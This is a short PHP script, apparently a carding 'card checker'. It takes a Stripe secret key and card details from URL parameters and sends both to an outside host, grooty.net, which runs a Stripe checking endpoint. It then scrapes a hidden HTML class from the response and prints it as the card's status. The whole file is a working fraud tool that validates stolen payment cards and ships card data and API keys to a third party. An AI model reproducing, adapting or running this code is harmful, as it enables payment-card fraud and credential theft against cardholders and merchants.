<?php 
$sk = $_GET['sk'];
$visa = $_GET['visa'];
$g = file_get_contents("http://grooty.net/Stripe_1_New.php?cc_info=$visa&sk=$sk&referrer=Tikol4Life&telebot=&tele_msg=3");
$f = str_replace('"',"'",$g);
preg_match_all("/class='(.*?)' style='display:none;'/",$f,$c2);
print_r(strtoupper($c2[1][0]));